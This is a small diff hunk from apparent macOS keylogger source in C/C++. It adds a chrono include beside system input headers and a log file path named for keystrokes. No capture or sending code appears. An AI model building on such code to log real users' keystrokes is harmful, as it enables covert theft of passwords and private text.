@@ -6,6 +6,7 @@
 #include <string.h>
 #include <ApplicationServices/ApplicationServices.h>
 #include <Carbon/Carbon.h>
+#include <chrono>
 
 FILE *logfile = NULL;
 const char *logfileLocation = "/var/log/keystroke.log";
